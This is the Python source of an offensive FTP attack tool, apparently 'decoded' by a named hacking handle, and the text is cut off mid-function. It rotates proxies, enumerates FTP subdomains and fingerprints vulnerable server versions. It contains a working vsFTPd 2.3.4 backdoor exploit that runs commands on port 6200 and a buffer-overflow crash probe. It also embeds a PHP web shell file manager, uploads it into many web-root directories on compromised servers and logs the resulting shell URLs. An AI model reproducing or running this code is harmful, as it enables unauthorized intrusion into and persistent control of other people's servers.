#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FTP Brute Force Scanner - Ultimate Power
Enhanced FTP Brute Force with Smart Password Generation & Advanced Techniques
DECODE BY @HackfutS3c
"""
import ftplib
import os
import sys
import time
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import re
from collections import OrderedDict
import string
import socket
import ssl
import struct

# PyQt5 imports for GUI
try:
    from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                                QHBoxLayout, QTextEdit, QPushButton, QLabel, 
                                QProgressBar, QFileDialog, QSpinBox, QTabWidget,
                                QFrame, QSplitter, QMessageBox, QCheckBox)
    from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
    from PyQt5.QtGui import QFont, QColor, QPalette, QPainter, QTextCursor
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

MAX_WORKERS = 25
RESULTS_FILE = "Cracked_FTP.txt"
ACTIVE_FTP_FILE = "Active_FTP.txt"
UPLOAD_LOG_FILE = "Upload_Results.txt"
SUBDOMAINS_FILE = "Discovered_Subdomains.txt"
BUFFER_OVERFLOW_FILE = "Buffer_Overflow_Vulns.txt"
SHELLS_FILE = "shell.txt"
print_lock = threading.Lock()
stats_lock = threading.Lock()
file_lock = threading.Lock()
global_stats = {
    'total': 0,
    'start_time': 0,
    'checked': 0,
    'active_ftp': 0,
    'success': 0,
    'failed': 0,
    'anonymous_access': 0,
    'uploads_success': 0,
    'uploads_failed': 0,
    'subdomains_found': 0,
    'buffer_overflow_vulns': 0,
    'buffer_overflow_exploited': 0,
    'shells_saved': 0,
}

class Colors:
    RED = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    RESET   = '\033[0m'
    BOLD    = '\033[1m'

# =============================================================================
# FONCTION DE NETTOYAGE DES CIBLES
# =============================================================================

def clean_target(target):
    """
    Nettoyer la cible FTP des protocoles et caractères indésirables
    """
    if not target:
        return None
    
    target = target.strip()
    
    # Enlever les protocoles http/https/ftp
    if '://' in target:
        target = target.split('://', 1)[1]
    
    # Enlever les slashs de fin
    target = target.rstrip('/')
    
    # Enlever les chemins (tout après le premier /)
    if '/' in target:
        target = target.split('/', 1)[0]
    
    # Enlever les paramètres (tout après le ?)
    if '?' in target:
        target = target.split('?', 1)[0]
    
    # Enlever les ancres (tout après le #)
    if '#' in target:
        target = target.split('#', 1)[0]
    
    # Enlever les espaces
    target = target.strip()
    
    # Si la cible est vide ou trop courte, retourner None
    if not target or len(target) < 3:
        return None
    
    return target

def clean_targets_list(targets):
    """
    Nettoyer une liste de cibles
    """
    cleaned = []
    seen = set()
    
    for target in targets:
        target = target.strip()
        if not target:
            continue
            
        # Nettoyer la cible
        clean = clean_target(target)
        if clean and clean not in seen:
            cleaned.append(clean)
            seen.add(clean)
    
    return cleaned

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_proxy = None
        self.proxy_file = "proxies.txt"
        
    def load_proxies(self):
        """Charger les proxies depuis un fichier"""
        try:
            if os.path.exists(self.proxy_file):
                with open(self.proxy_file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                    print(f"{Colors.GREEN}[PROXY] Loaded {len(self.proxies)} proxies{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[PROXY] No proxy file found, continuing without proxies{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[PROXY] Error loading proxies: {e}{Colors.RESET}")
    
    def get_next_proxy(self):
        """Obtenir le prochain proxy"""
        if not self.proxies:
            return None
            
        if not self.current_proxy:
            self.current_proxy = random.choice(self.proxies)
        else:
            current_index = self.proxies.index(self.current_proxy)
            next_index = (current_index + 1) % len(self.proxies)
            self.current_proxy = self.proxies[next_index]
            
        return self.current_proxy

# Initialisation du gestionnaire de proxies
proxy_manager = ProxyManager()
proxy_manager.load_proxies()

# =============================================================================
# DÉTECTION DES SOUS-DOMAINES FTP
# =============================================================================

def generate_ftp_subdomains(base_domain):
    """Générer des sous-domaines FTP courants"""
    common_ftp_subdomains = [
        'ftp', 'ftp1', 'ftp2', 'ftp3', 'ftps', 'ftpserver',
        'files', 'file', 'download', 'upload', 'data', 'storage',
        'archive', 'backup', 'mirror', 'pub', 'public', 'shared',
        'ftp-server', 'ftpserver', 'sftp', 'ftpes', 'ftpd',
        'ftp-access', 'ftp-site', 'ftp-host', 'ftp-main',
        'ftp01', 'ftp02', 'ftp03', 'ftp04', 'ftp05',
        'ftp-test', 'ftp-dev', 'ftp-staging', 'ftp-prod',
        'ftp-internal', 'ftp-external', 'ftp-secure',
        'ftp-admin', 'ftp-web', 'ftp-site', 'ftp-main',
        'old-ftp', 'new-ftp', 'legacy-ftp', 'modern-ftp',
        'ftp-backup', 'ftp-archive', 'ftp-mirror',
        'ftp-download', 'ftp-upload', 'ftp-files',
        'ftp-data', 'ftp-storage', 'ftp-share',
        'ftp-cdn', 'ftp-content', 'ftp-media',
        'ftp-images', 'ftp-videos', 'ftp-docs',
        'ftp-app', 'ftp-mobile', 'ftp-web',
        'ftp-blog', 'ftp-shop', 'ftp-store',
        'ftp-mail', 'ftp-email', 'ftp-news',
        'ftp-support', 'ftp-help', 'ftp-info',
        'ftp-admin', 'ftp-root', 'ftp-super',
        'ftp-user', 'ftp-guest', 'ftp-test',
        'ftp-demo', 'ftp-temp', 'ftp-tmp'
    ]
    
    subdomains = []
    for sub in common_ftp_subdomains:
        subdomains.append(f"{sub}.{base_domain}")
    
    # Ajouter des variations avec le nom de domaine
    domain_parts = base_domain.split('.')
    if len(domain_parts) > 1:
        main_domain = domain_parts[0]
        for sub in common_ftp_subdomains[:20]:
            subdomains.append(f"{sub}-{main_domain}.{'.'.join(domain_parts[1:])}")
            subdomains.append(f"{main_domain}-{sub}.{'.'.join(domain_parts[1:])}")
    
    return list(set(subdomains))

def discover_ftp_subdomains(domain):
    """Découvrir les sous-domaines FTP actifs"""
    with print_lock:
        print(f"{Colors.CYAN}[SUBDOMAIN-SCAN] Discovering FTP subdomains for: {domain}{Colors.RESET}")
    
    subdomains = generate_ftp_subdomains(domain)
    active_subdomains = []
    
    def check_subdomain(subdomain):
        try:
            socket.gethostbyname(subdomain)
            
            is_active, status_msg = check_ftp_active(subdomain, 21, 5)
            if is_active:
                with print_lock:
                    print(f"{Colors.GREEN}[SUBDOMAIN-FOUND] {subdomain} - FTP Active{Colors.RESET}")
                active_subdomains.append(subdomain)
                
                with file_lock:
                    with open(SUBDOMAINS_FILE, 'a', encoding='utf-8') as f:
                        f.write(f"{subdomain}:21 - {status_msg}\n")
                        f.flush()
                
                with stats_lock:
                    global_stats['subdomains_found'] += 1
                
                return True
        except:
            pass
        return False
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(check_subdomain, sub) for sub in subdomains]
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    return active_subdomains

# =============================================================================
# DÉTECTION ET EXPLOITATION BUFFER OVERFLOW
# =============================================================================

class BufferOverflowExploiter:
    """Classe pour détecter et exploiter les vulnérabilités de buffer overflow FTP"""
    
    def __init__(self):
        self.vuln_servers = []
        
    def detect_buffer_overflow_vulnerability(self, hostname, port=21, timeout=10):
        """Détecter les vulnérabilités de buffer overflow dans le serveur FTP"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(hostname, port, timeout=timeout)
            welcome_msg = ftp.getwelcome()
            
            vuln_indicators = [
                'vsFTPd 1.1.0', 'vsFTPd 1.2.0', 'vsFTPd 1.2.1', 'vsFTPd 1.2.2',
                'Warftpd 1.65', 'FreeFloatFTPd', 'Ability Server 2.34',
                'ProFTPD 1.2.0', 'ProFTPD 1.2.8', 'ProFTPD 1.2.9', 'ProFTPD 1.2.10'
            ]
            
            for indicator in vuln_indicators:
                if indicator in welcome_msg:
                    with print_lock:
                        print(f"{Colors.RED}[BUFFER-OVERFLOW] Potential vulnerability detected: {indicator} on {hostname}:{port}{Colors.RESET}")
                    return True, indicator, welcome_msg
            
            test_payloads = [
                'A' * 1000,
                'A' * 2000,
                'A' * 5000,
                '%s' * 100,
                '\x00' * 100,
            ]
            
            for payload in test_payloads:
                try:
                    ftp.login(payload, "test")
                except ftplib.error_perm:
                    pass
                except (ftplib.error_temp, ConnectionResetError, BrokenPipeError, TimeoutError):
                    with print_lock:
                        print(f"{Colors.RED}[BUFFER-OVERFLOW] Server might be vulnerable to buffer overflow with payload length {len(payload)} on {hostname}:{port}{Colors.RESET}")
                    return True, f"Crash with payload {len(payload)}", welcome_msg
                except Exception as e:
                    if "timed out" in str(e).lower() or "connection reset" in str(e).lower():
                        with print_lock:
                            print(f"{Colors.RED}[BUFFER-OVERFLOW] Server might be vulnerable to buffer overflow on {hostname}:{port}{Colors.RESET}")
                        return True, f"Timeout/crash with payload {len(payload)}", welcome_msg
            
            ftp.quit()
            return False, None, welcome_msg
            
        except Exception as e:
            return False, f"Error: {str(e)}", None
    
    def exploit_vsftpd_234_backdoor(self, hostname, port=21, timeout=10):
        """Exploiter la backdoor vsFTPd 2.3.4"""
        try:
            with print_lock:
                print(f"{Colors.MAGENTA}[EXPLOIT] Attempting vsFTPd 2.3.4 backdoor exploit on {hostname}:{port}{Colors.RESET}")
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((hostname, port))
            
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            
            if 'vsFTPd 2.3.4' in banner:
                s.send(b'USER hello:)\n')
                time.sleep(1)
                s.send(b'PASS whatever\n')
                
                time.sleep(2)
                
                try:
                    backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    backdoor_socket.settimeout(5)
                    backdoor_socket.connect((hostname, 6200))
                    
                    with print_lock:
                        print(f"{Colors.GREEN}[EXPLOIT-SUCCESS] vsFTPd 2.3.4 backdoor exploited on {hostname}:6200{Colors.RESET}")
                    
                    backdoor_socket.send(b'id\n')
                    response = backdoor_socket.recv(1024).decode('utf-8', errors='ignore')
                    
                    with print_lock:
                        print(f"{Colors.GREEN}[EXPLOIT-RESULT] Command output: {response}{Colors.RESET}")
                    
                    backdoor_socket.close()
                    s.close()
                    
                    with file_lock:
                        with open(BUFFER_OVERFLOW_FILE, 'a', encoding='utf-8') as f:
                            f.write(f"[SUCCESS] {hostname}:{port} - vsFTPd 2.3.4 backdoor exploited on port 6200\n")
                            f.write(f"Command output: {response}\n")
                            f.write("-" * 50 + "\n")
                    
                    with stats_lock:
                        global_stats['buffer_overflow_exploited'] += 1
                    
                    return True, response
                    
                except:
                    with print_lock:
                        print(f"{Colors.RED}[EXPLOIT-FAILED] vsFTPd 2.3.4 backdoor not accessible on port 6200{Colors.RESET}")
                    s.close()
                    return False, "Backdoor port not accessible"
            else:
                s.close()
                return False, "Not vsFTPd 2.3.4"
                
        except Exception as e:
            with print_lock:
                print(f"{Colors.RED}[EXPLOIT-ERROR] vsFTPd exploit failed: {str(e)}{Colors.RESET}")
            return False, str(e)
    
    def exploit_generic_buffer_overflow(self, hostname, port=21, timeout=10):
        """Tentative d'exploitation générique de buffer overflow"""
        try:
            with print_lock:
                print(f"{Colors.MAGENTA}[EXPLOIT] Attempting generic buffer overflow exploitation on {hostname}:{port}{Colors.RESET}")
            
            pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((hostname, port))
            
            s.recv(1024)
            
            s.send(b'USER ' + pattern + b'\n')
            response = s.recv(1024)
            
            s.close()
            
            if b"segmentation" in response.lower() or b"fault" in response.lower():
                with print_lock:
                    print(f"{Colors.GREEN}[EXPLOIT-SUCCESS] Possible buffer overflow triggered on {hostname}:{port}{Colors.RESET}")
                
                with file_lock:
                    with open(BUFFER_OVERFLOW_FILE, 'a', encoding='utf-8') as f:
                        f.write(f"[POSSIBLE] {hostname}:{port} - Buffer overflow may have been triggered\n")
                        f.write(f"Response: {response}\n")
                        f.write("-" * 50 + "\n")
                
                with stats_lock:
                    global_stats['buffer_overflow_exploited'] += 1
                
                return True, "Possible buffer overflow triggered"
            
            return False, "No obvious crash detected"
            
        except Exception as e:
            if "timed out" in str(e).lower() or "connection reset" in str(e).lower():
                with print_lock:
                    print(f"{Colors.GREEN}[EXPLOIT-SUCCESS] Connection behavior suggests possible crash on {hostname}:{port}{Colors.RESET}")
                
                with file_lock:
                    with open(BUFFER_OVERFLOW_FILE, 'a', encoding='utf-8') as f:
                        f.write(f"[POSSIBLE] {hostname}:{port} - Connection behavior suggests crash\n")
                        f.write(f"Error: {str(e)}\n")
                        f.write("-" * 50 + "\n")
                
                with stats_lock:
                    global_stats['buffer_overflow_exploited'] += 1
                
                return True, f"Crash behavior: {str(e)}"
            
            return False, str(e)

buffer_exploiter = BufferOverflowExploiter()

def test_buffer_overflow_vulnerabilities(hostname, port=21):
    """Tester les vulnérabilités de buffer overflow sur un serveur FTP"""
    with print_lock:
        print(f"{Colors.YELLOW}[BUFFER-TEST] Testing buffer overflow vulnerabilities on {hostname}:{port}{Colors.RESET}")
    
    is_vulnerable, details, banner = buffer_exploiter.detect_buffer_overflow_vulnerability(hostname, port)
    
    if is_vulnerable:
        with print_lock:
            print(f"{Colors.RED}[BUFFER-VULN] Vulnerable: {hostname}:{port} - {details}{Colors.RESET}")
        
        with file_lock:
            with open(BUFFER_OVERFLOW_FILE, 'a', encoding='utf-8') as f:
                f.write(f"[VULNERABLE] {hostname}:{port}\n")
                f.write(f"Banner: {banner}\n")
                f.write(f"Details: {details}\n")
                f.write("-" * 50 + "\n")
        
        with stats_lock:
            global_stats['buffer_overflow_vulns'] += 1
        
        if 'vsFTPd 2.3.4' in banner:
            success, result = buffer_exploiter.exploit_vsftpd_234_backdoor(hostname, port)
        else:
            success, result = buffer_exploiter.exploit_generic_buffer_overflow(hostname, port)
        
        return True, details, success
    else:
        return False, details, False

# =============================================================================
# FONCTIONS AMÉLIORÉES POUR L'UPLOAD ET SAUVEGARDE DES SHELLS
# =============================================================================

def create_admin_php():
    """Créer le fichier admin.php à uploader"""
    admin_content = """<?php
@ini_set('display_errors', 0);
@set_time_limit(0);
error_reporting(0);

function safe($s) {
    return htmlspecialchars($s, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function formatSize($bytes) {
    $units = ['B','KB','MB','GB','TB'];
    for ($i = 0; $bytes >= 1024 && $i < count($units)-1; $i++) {
        $bytes /= 1024;
    }
    return round($bytes, 2).' '.$units[$i];
}

$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
$cwd = realpath($cwd);

// Handle upload
if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $target = $cwd . '/' . basename($_FILES['file']['name']);
    if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "<div style='color:#0f0'>[+] File uploaded successfully.</div>";
    } else {
        echo "<div style='color:#f00'>[-] Upload failed.</div>";
    }
}

// Handle file edit save
if (isset($_POST['save']) && isset($_POST['filename'])) {
    $path = $cwd.'/'.basename($_POST['filename']);
    if (@file_put_contents($path, $_POST['content']) !== false) {
        echo "<div style='color:#0f0'>[+] File saved successfully.</div>";
    } else {
        echo "<div style='color:#f00'>[-] Failed to save file.</div>";
    }
}

// Handle create directory
if (isset($_POST['mkdir']) && isset($_POST['dirname'])) {
    $dirName = basename($_POST['dirname']);
    $fullPath = $cwd . '/' . $dirName;
    if (!file_exists($fullPath)) {
        if (@mkdir($fullPath)) {
            echo "<div style='color:#0f0'>[+] Directory created.</div>";
        } else {
            echo "<div style='color:#f00'>[-] Failed to create directory.</div>";
        }
    } else {
        echo "<div style='color:#f90'>[!] Directory already exists.</div>";
    }
}

echo "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>File Manager</title><style>
body { background:#0d0d0d; color:#ccc; font-family:monospace; padding:20px; }
a { color:#5af; text-decoration:none; }
a:hover { text-decoration:underline; }
input, textarea, select { background:#111; color:#0f0; border:1px solid #444; padding:5px; width:100%; }
input[type=submit] { background:#222; color:#0f0; border:1px solid #0f0; cursor:pointer; }
hr { border:none; border-top:1px solid #333; margin:20px 0; }
.dir { color:#0ff; }
.file { color:#fff; }
.size { color:#999; float:right; }
h2 { margin:0 0 10px 0; }
</style></head><body>";

echo "<h2>Hackfut Security File Manager</h2>";
echo "<b>Current Path:</b> ".safe($cwd)."<hr>";

// Show navigation
$parts = explode(DIRECTORY_SEPARATOR, $cwd);
$nav = "";
$build = "";
foreach ($parts as $p) {
    if ($p == "") continue;
    $build .= "/$p";
    $nav .= "<a href='?path=".urlencode($build)."'>".safe($p)."</a> / ";
}
echo $nav."<hr>";

// File listing
$files = @scandir($cwd);
echo "<ul style='list-style:none;padding:0;'>";
foreach ($files as $f) {
    if ($f == ".") continue;
    $fp = $cwd.'/'.$f;
    if (is_dir($fp)) {
        echo "<li class='dir'>📁 <a href='?path=".urlencode($fp)."'>".safe($f)."</a></li>";
    } else {
        echo "<li class='file'>📄 <a href='?path=".urlencode($cwd)."&edit=".urlencode($f)."'>".safe($f)."</a><span class='size'>(".formatSize(filesize($fp)).")</span></li>";
    }
}
echo "</ul><hr>";

// Edit file
if (isset($_GET['edit'])) {
    $file = basename($_GET['edit']);
    $full = $cwd.'/'.$file;
    if (file_exists($full)) {
        $content = @file_get_contents($full);
        echo "<h3>Editing: ".safe($file)."</h3>";
        echo "<form method='post'>";
        echo "<input type='hidden' name='filename' value='".safe($file)."'>";
        echo "<textarea name='content' rows='15'>".safe($content)."</textarea><br>";
        echo "<input type='submit' name='save' value='Save File'>";
        echo "</form><hr>";
    }
}

// Upload
echo "<h3>Upload File</h3>";
echo "<form method='post' enctype='multipart/form-data'>";
echo "<input type='file' name='file'><br>";
echo "<input type='submit' name='upload' value='Upload'>";
echo "</form><hr>";

// Create folder
echo "<h3>Create Folder</h3>";
echo "<form method='post'>";
echo "<input type='text' name='dirname' placeholder='New folder name'>";
echo "<input type='submit' name='mkdir' value='Create'>";
echo "</form>";

echo "</body></html>";
?>
"""
    try:
        with open("admin.php", "w", encoding='utf-8') as f:
            f.write(admin_content)
        print(f"{Colors.GREEN}[SUCCESS] admin.php created successfully{Colors.RESET}")
        return "admin.php"
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Failed to create admin.php: {e}{Colors.RESET}")
        return None

def save_shell_url(hostname, port, directory_path):
    """Sauvegarder l'URL du shell dans shell.txt"""
    try:
        if directory_path.startswith('/'):
            directory_path = directory_path[1:]
        if directory_path.endswith('/'):
            directory_path = directory_path[:-1]
        
        if port == 21:
            url = f"http://{hostname}/admin.php"
        else:
            url = f"http://{hostname}:{port}/{directory_path}/admin.php"
        
        with file_lock:
            with open(SHELLS_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{url}\n")
                f.flush()
        
        with stats_lock:
            global_stats['shells_saved'] += 1
        
        with print_lock:
            print(f"{Colors.GREEN}[SHELL-SAVED] {url}{Colors.RESET}")
        
        return url
    except Exception as e:
        with print_lock:
            print(f"{Colors.RED}[ERROR] Failed to save shell URL: {e}{Colors.RESET}")
        return None

def test_shell_access(hostname, port, directory_path):
    """Tester l'accès au shell uploadé"""
    try:
        import requests
        from urllib3.exceptions import InsecureRequestWarning
        
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        
        if port == 21:
            url = f"http://{hostname}/{directory_path}/admin.php"
        else:
            url = f"http://{hostname}:{port}/{directory_path}/admin.php"
        
        response = requests.get(url, timeout=10, verify=False)
        
        if response.status_code == 200:
            return True, url
        else:
            return False, url
    except:
        return False, None

def upload_admin_php_improved(hostname, username, password, port=21):
    """Upload amélioré de admin.php avec sauvegarde des URLs"""
    try:
        ftp = ftplib.FTP()
        ftp.connect(hostname, port, timeout=15)
        ftp.login(username, password)
        
        upload_success = []
        upload_failed = []
        shell_urls = []
        
        admin_file = create_admin_php()
        if not admin_file:
            return False, [], [], []
        
        def upload_to_directory(ftp, path):
            """Upload admin.php to specific directory"""
            try:
                original_dir = ftp.pwd()
                ftp.cwd(path)
                
                with open(admin_file, 'rb') as f:
                    ftp.storbinary(f'STOR admin.php', f)
                
                ftp.cwd(original_dir)
                return True, path
            except Exception as e:
                return False, f"{path} - {str(e)}"
        
        def test_directory_access(ftp, path):
            """Tester l'accès au répertoire"""
            try:
                original_dir = ftp.pwd()
                ftp.cwd(path)
                ftp.cwd(original_dir)
                return True
            except:
                return False
        
        success, result = upload_to_directory(ftp, '/')
        if success:
            upload_success.append(result)
            shell_url = save_shell_url(hostname, port, '')
            if shell_url:
                shell_urls.append(shell_url)
        else:
            upload_failed.append(result)
        
        common_dirs = [
            '/', '/www', '/public_html', '/htdocs', '/web', '/html',
            '/var/www', '/var/www/html', '/home', '/uploads', '/images',
            '/css', '/js', '/admin', '/cgi-bin', '/tmp', '/wwwroot',
            '/httpdocs', '/public', '/webroot', '/site', '/www/public_html'
        ]
        
        for directory in common_dirs:
            try:
                if test_directory_access(ftp, directory):
                    success, result = upload_to_directory(ftp, directory)
                    if success:
                        upload_success.append(result)
                        clean_path = directory.strip('/')
                        shell_url = save_shell_url(hostname, port, clean_path)
                        if shell_url:
                            shell_urls.append(shell_url)
                    else:
                        upload_failed.append(result)
                else:
                    upload_failed.append(f"{directory} - No access")
            except Exception as e:
                upload_failed.append(f"{directory} - {str(e)}")
        
        try:
            directories = []
            ftp.retrlines('LIST', directories.append)
            
            for line in directories:
                if line.startswith('d'):
                    parts = line.split()
                    if len(parts) >= 9:
                        dirname = parts[-1]
                        if dirname not in ['.', '..'] and len(dirname) <= 50:
                            try:
                                if test_directory_access(ftp, dirname):
                                    success, result = upload_to_directory(ftp, dirname)
                                    if success:
                                        upload_success.append(result)
                                        shell_url = save_shell_url(hostname, port, dirname)
                                        if shell_url:
                                            shell_urls.append(shell_url)
                                    else:
                                        upload_failed.append(result)
                            except:
                                upload_failed.append(dirname)
        except Exception as e:
            pass
        
        ftp.quit()
        
        with file_lock:
            with open(UPLOAD_LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(f"\n[{datetime.now()}] UPLOAD RESULTS for {hostname}:{port}#{username}\n")
                f.write(f"SUCCESS: {upload_success}\n")
                f.write(f"SHELL_URLS: {shell_urls}\n")
                f.write(f"FAILED: {upload_failed}\n")
                f.write("-" * 50 + "\n")
        
        return len(upload_success) > 0, upload_success, upload_failed, shell_urls
        
    except Exception as e:
        with print_lock:
            print(f"{Colors.RED}[UPLOAD-ERROR] {hostname}:{port} - {str(e)}{Colors.RESET}")
        return False, [], [str(e)], []

def check_ftp_active(hostname, port=21, timeout=8):
    """Vérifier si le serveur FTP est actif et accessible"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((hostname, port))
        sock.close()
        
        if result == 0:
            ftp = ftplib.FTP()
            ftp.connect(hostname, port, timeout=timeout)
            welcome_msg = ftp.getwelcome()
            ftp.quit()
            
            ftp_indicators = ['FTP', '220', 'Service ready', 'vsFTPd', 'ProFTPD', 'Pure-FTPd']
            if any(indicator in welcome_msg for indicator in ftp_indicators):
                return True, welcome_msg
            return True, "Active but unknown FTP server"
        return False, "Port closed or unreachable"
        
    except ftplib.error_perm:
        return True, "FTP server (auth required)"
    except ftplib.error_temp:
        return True, "FTP server (temporary error)"
    except Exception as e:
        return False, f"Error: {str(e)}"

def extract_domain_info(hostname):
    """Extract domain information from hostname"""
    try:
        domain = hostname.replace('www.', '')
        name = domain.split('.')[0]
        words = re.findall(r'[a-zA-Z]+', name)
        numbers = re.findall(r'[0-9]+', name)
        tld = domain.split('.')[-1] if '.' in domain else ''
        parts = domain.split('.')
